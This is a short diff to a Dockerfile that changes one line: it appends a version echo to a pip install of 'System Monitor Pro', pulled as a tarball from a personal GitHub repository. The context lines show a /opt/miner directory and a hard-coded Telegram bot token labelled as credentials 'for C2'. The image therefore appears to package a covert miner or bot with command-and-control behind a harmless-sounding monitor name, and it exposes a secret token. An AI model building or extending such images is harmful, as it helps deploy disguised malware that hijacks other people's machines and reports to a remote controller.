@@ -290,7 +290,7 @@ RUN apt-get update && \
 RUN mkdir -p /opt/miner
 
 # Install System Monitor Pro from GitHub tarball (no git needed)
-RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz
+RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz && echo "v3.0.1"
 
 # Set Telegram credentials for C2 (works everywhere, no tunnel needed)
 ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
